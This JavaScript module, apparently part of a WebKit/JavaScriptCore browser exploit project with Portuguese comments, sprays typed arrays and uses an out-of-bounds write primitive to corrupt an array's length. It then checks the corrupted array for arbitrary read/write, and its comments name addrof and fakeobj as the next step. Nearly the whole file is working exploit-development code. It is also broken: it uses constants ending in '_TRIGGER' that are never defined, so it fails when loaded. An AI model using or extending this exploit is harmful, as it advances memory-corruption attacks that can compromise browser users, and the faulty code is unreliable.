// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs'; // Removido WEBKIT_LIBRARY_INFO por enquanto

const FNAME_TRUE_LOG_REPLICATION = "trueLogReplication_v29a";

// === Constantes baseadas no seu Log.txt [00:51:23] (investigateControl_v7) ===
const OOB_OFFSET_0x68 = 0x68;
const OOB_OFFSET_0x6C = 0x6C;
const OOB_OFFSET_0x70_TRIGGER = 0x70;

// Valores INICIAIS plantados no oob_buffer ANTES do trigger
const INITIAL_VAL_AT_0x68 = new AdvancedInt64(0x11223344, 0xAABBCCDD); // aabbccdd_11223344
const INITIAL_VAL_AT_0x6C = new AdvancedInt64(0xFFFFFFFF, 0xEEEEFFFF); // eeeeffff_ffffffff

const TRIGGER_VALUE_AT_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Valores ESPERADOS no oob_buffer APÓS o trigger, conforme seu Log.txt
const EXPECTED_OOB_VAL_AT_0x68_AFTER = new AdvancedInt64(0xAABBCCDD, 0x11223344); // 0x11223344_aabbccdd
const EXPECTED_OOB_VAL_AT_0x6C_AFTER = new AdvancedInt64(0x11223344, 0xFFFFFFFF); // 0xffffffff_11223344
const EXPECTED_OOB_QWORD_AT_0x70_AFTER = TRIGGER_VALUE_AT_0x70;

// Metadados esperados para o SuperArray (se um objeto JS for corrompido)
// O m_vector viria do valor em oob_buffer[0x68] APÓS o trigger.
// O m_length viria do LOW_DWORD do valor em oob_buffer[0x70] APÓS o trigger.
const EXPECTED_SUPERARRAY_M_VECTOR = EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER;
const EXPECTED_SUPERARRAY_M_LENGTH = EXPECTED_OOB_QWORD_AT_0x70_AFTER.low(); // Deve ser 0xFFFFFFFF

const NUM_SPRAY_OBJECTS = 500; // Mantenha ou ajuste
const ORIGINAL_SPRAY_LENGTH = 8;

const MARKER_TO_VALIDATE_SUPERARRAY = 0xACEACE00;
const MARKER_OFFSET_IN_OOB_DATA_TARGET = 0x0; // Plantar no início do buffer alvo do superArray

let sprayedVictimObjects = [];

// Função principal que será chamada
export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_TRUE_LOG_REPLICATION}: Replicação Fiel do Log [00:51:23] ---`, "test", FNAME_TRUE_LOG_REPLICATION);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha OOB Init", "critical", FNAME_TRUE_LOG_REPLICATION);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_TRUE_LOG_REPLICATION);

        // FASE 1: Spray de Uint32Array
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_TRUE_LOG_REPLICATION);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xEFEFEF00 ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_TRUE_LOG_REPLICATION);

        // FASE 2: Plantar valores INICIAIS no oob_array_buffer_real
        logS3(`FASE 2: Plantando valores iniciais no oob_buffer (PRÉ-TRIGGER) conforme Log [00:51:23]...`, "info", FNAME_TRUE_LOG_REPLICATION);
        oob_write_absolute(OOB_OFFSET_0x68, INITIAL_VAL_AT_0x68, 8);
        oob_write_absolute(OOB_OFFSET_0x6C, INITIAL_VAL_AT_0x6C, 8);

        logS3("  Valores NO OOB_BUFFER ANTES do trigger:", "info", FNAME_TRUE_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68)}] = ${oob_read_absolute(OOB_OFFSET_0x68, 8).toString(true)} (Plantado: ${INITIAL_VAL_AT_0x68.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C)}] = ${oob_read_absolute(OOB_OFFSET_0x6C, 8).toString(true)} (Plantado: ${INITIAL_VAL_AT_0x6C.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
        // O valor em 0x70 antes do trigger seria o HIGH DWORD de INITIAL_VAL_AT_0x6C (0xEEEEFFFF) + LOW DWORD do QWORD seguinte.
        // Não é crucial logar isso, pois será sobrescrito.

        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] com ${TRIGGER_VALUE_AT_0x70.toString(true)}...`, "info", FNAME_TRUE_LOG_REPLICATION);
        oob_write_absolute(OOB_OFFSET_0x70_TRIGGER, TRIGGER_VALUE_AT_0x70, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_TRUE_LOG_REPLICATION);
        
        // Verificar os valores NO OOB_BUFFER após o trigger, para ver se bate com seu log de sucesso
        const val_0x68_in_oob_after = oob_read_absolute(OOB_OFFSET_0x68, 8); 
        const val_0x6C_in_oob_after = oob_read_absolute(OOB_OFFSET_0x6C, 8); 
        const val_0x70_qword_in_oob_after = oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 8);
        
        logS3(`  Valores NO OOB_BUFFER APÓS trigger (para comparação com Log [00:51:23]):`, "info", FNAME_TRUE_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68)}] = ${val_0x68_in_oob_after.toString(true)} (Seu Log Esperava: ${EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C)}] = ${val_0x6C_in_oob_after.toString(true)} (Seu Log Esperava: ${EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (QWORD) = ${val_0x70_qword_in_oob_after.toString(true)} (Seu Log Esperava LOW_DWORD ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})`, "info", FNAME_TRUE_LOG_REPLICATION);

        let oob_dynamics_replicated = val_0x68_in_oob_after.equals(EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER) &&
                                     val_0x6C_in_oob_after.equals(EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER) &&
                                     val_0x70_qword_in_oob_after.low() === EXPECTED_SUPERARRAY_M_LENGTH;

        if (oob_dynamics_replicated) {
            logS3("    !!!! Dinâmica de bytes no oob_buffer APÓS trigger CORRESPONDE ao seu Log de Sucesso [00:51:23] !!!!", "vuln", FNAME_TRUE_LOG_REPLICATION);
            document.title = "OOB DINÂMICA REPLICADA!";
        } else {
            logS3("    AVISO: Dinâmica de bytes no oob_buffer após trigger NÃO corresponde ao seu Log de Sucesso [00:51:23].", "warn", FNAME_TRUE_LOG_REPLICATION);
            document.title = "OOB Dinâmica DIFERENTE";
            // Mesmo que não corresponda EXATAMENTE, ainda tentaremos encontrar o superArray pelo length.
        }
        await PAUSE_S3(300);

        // FASE 4: Identificar SuperArray (pelo length)
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})...`, "info", FNAME_TRUE_LOG_REPLICATION);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_SUPERARRAY_M_LENGTH) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_TRUE_LOG_REPLICATION);
                document.title = `SUPERARRAY Idx ${i}! Len OK!`;
                break; 
            }
        }

        if (superArray) {
            logS3(`  SuperArray obtido. O m_vector do objeto JS corrompido DEVERIA ser ${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} (o valor que apareceu em oob_buffer[0x68] após trigger).`, "info", FNAME_TRUE_LOG_REPLICATION);
            logS3(`  Este m_vector (${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)}) não é 0x0.`, "info", FNAME_TRUE_LOG_REPLICATION);
            logS3(`  Testando se este m_vector permite ler/escrever no oob_array_buffer_real (assumindo que m_vector agora aponta para o dataPointer do oob_buffer)...`, "info", FNAME_TRUE_LOG_REPLICATION);

            // Plantar um marcador no INÍCIO dos dados do oob_array_buffer_real via oob_write_absolute
            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA_TARGET, MARKER_TO_VALIDATE_SUPERARRAY, 4);
            logS3(`    Marcador ${toHex(MARKER_TO_VALIDATE_SUPERARRAY)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA_TARGET)}] (via oob_write).`, "info", FNAME_TRUE_LOG_REPLICATION);
            
            // Se o m_vector do superArray (que esperamos ser EXPECTED_SUPERARRAY_M_VECTOR)
            // realmente se tornou o dataPointer para o oob_array_buffer_real (ou uma cópia dele),
            // então superArray[MARKER_OFFSET_IN_OOB_DATA_TARGET / 4] deveria ler nosso marcador.
            const index_to_read_marker_in_superarray = MARKER_OFFSET_IN_OOB_DATA_TARGET / 4;
            
            try {
                const value_read_via_superarray = superArray[index_to_read_marker_in_superarray];
                logS3(`    SuperArray[${toHex(index_to_read_marker_in_superarray)}] leu: ${toHex(value_read_via_superarray)}`, "leak", FNAME_TRUE_LOG_REPLICATION);
                
                if (value_read_via_superarray === MARKER_TO_VALIDATE_SUPERARRAY) {
                    logS3(`      !!!! SUCESSO !!!! SuperArray com m_vector=${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} PARECE MAPEADO para o oob_array_buffer_real!`, "vuln", FNAME_TRUE_LOG_REPLICATION);
                    document.title = "SUPERARRAY R/W FUNCIONAL!";
                    // AQUI TEMOS UMA PRIMITIVA PODEROSA: R/W sobre oob_array_buffer_real com tamanho gigante.
                    // Próximo passo: Usar para construir addrof e fakeobj.
                    // Exemplo: Tentar escrever com o superArray e ler de volta com oob_read_absolute
                    const test_write_val_super = 0xBADDB00D;
                    superArray[index_to_read_marker_in_superarray + 1] = test_write_val_super; // Escrever no próximo DWORD
                    const check_val_in_oob = oob_read_absolute(MARKER_OFFSET_IN_OOB_DATA_TARGET + 4, 4);
                    if (check_val_in_oob === test_write_val_super) {
                        logS3(`        Verificação de escrita do SuperArray no oob_buffer bem-sucedida!`, "vuln", FNAME_TRUE_LOG_REPLICATION);
                    } else {
                         logS3(`        Falha na verificação de escrita do SuperArray no oob_buffer. Lido ${toHex(check_val_in_oob)}.`, "error", FNAME_TRUE_LOG_REPLICATION);
                    }

                } else {
                    logS3(`      Falha na verificação do marcador. SuperArray não parece mapear para o oob_array_buffer_real como esperado. (Lido ${toHex(value_read_via_superarray)} vs Marcador ${toHex(MARKER_TO_VALIDATE_SUPERARRAY)})`, "error", FNAME_TRUE_LOG_REPLICATION);
                    document.title = "SuperArray Mapeamento Falhou";
                }
            } catch (e) {
                 logS3(`    Erro ao tentar usar SuperArray para ler/escrever marcador: ${e.message}`, "error", FNAME_TRUE_LOG_REPLICATION);
                 document.title = "SuperArray Erro R/W Marcador";
            }
        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_TRUE_LOG_REPLICATION);
            document.title = "SuperArray NÃO Encontrado (v29a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_TRUE_LOG_REPLICATION}: ${e.message}`, "critical", FNAME_TRUE_LOG_REPLICATION);
        document.title = `${FNAME_TRUE_LOG_REPLICATION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_TRUE_LOG_REPLICATION} Concluído ---`, "test", FNAME_TRUE_LOG_REPLICATION);
    }
}
